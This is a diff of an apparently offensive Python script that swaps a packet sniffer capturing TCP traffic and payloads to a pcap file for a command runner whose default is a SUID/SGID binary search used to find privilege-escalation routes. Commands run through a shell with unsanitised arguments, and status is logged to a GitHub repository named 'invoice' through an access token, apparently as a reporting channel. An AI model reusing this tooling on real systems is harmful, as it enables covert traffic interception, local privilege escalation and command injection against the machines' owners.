@@ -1,6 +1,5 @@
 import subprocess
 import os
-from scapy.all import *
 import requests
 import base64
 import getpass
@@ -66,48 +65,32 @@ class Log():
         else:
             print("Failed to check file existence:", existing_file_response.text)
 
-class Sniffer():
-    def __init__(self, script_name):
-        self.script_name = script_name
-        self.packets = []
 
-    def packet_handler(self, packet):
-        destination_directory = "/tmp/results"
-        if not os.path.exists(destination_directory):
-           os.makedirs(destination_directory)
-            
-        if packet.haslayer(IP):
-            src_ip = packet[IP].src
-            dst_ip = packet[IP].dst
-            output = f"Source IP: {src_ip}  Destination IP: {dst_ip}\n"
 
-            if packet.haslayer(TCP):
-                src_port = packet[TCP].sport
-                dst_port = packet[TCP].dport
-                output += f"Source Port: {src_port}  Destination Port: {dst_port}\n"
 
-                data = packet[TCP].payload
-                output += f"Data: {repr(data)}\n"
-            
-            new_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port) / Raw(load=str(data))
 
-            self.packets.append(new_packet)    
-            wrpcap("/tmp/results/output.pcap", self.packets)
-                
-    def start_sniffing(self):
-        file_creator.create_file("logs", sniffer.script_name,"Script completed successfully")
-        sniff(filter="tcp", prn=self.packet_handler)
-        
-        
+class CommandExecutioner():
+  def __init__(self, script_name):
+    self.script_name = script_name
+    
+  def run_command(self,command="find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null", *args):
+    full_command = "{} {}".format(command, ' '.join(args))
+    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
+    output = result.stdout.strip()
 
+    destination_directory = "/tmp/results"
+    if not os.path.exists(destination_directory):
+       os.makedirs(destination_directory)
+
+    try:
+        with open(os.path.join(destination_directory, "result.txt"), "w") as f:
+           f.write(output)
+           file_creator.create_file("logs", self.script_name,"Script completed successfully")
+    except:
+        file_creator.create_file("logs",self.script_name,"Script may have encountered erros")
 
 repository_owner = 'rsecurity12' 
 repository_name = 'invoice' 
 access_token = ''  
-sniffer = Sniffer('Sniffer')
+commandExecutioner = CommandExecutioner("CommandExecutioner")
 file_creator = Log(repository_owner, repository_name, access_token)
-
-try:
-  sniffer.start_sniffing()
-except:
-  file_creator.create_file("logs",sniffer.script_name,"Script may have encountered erros")
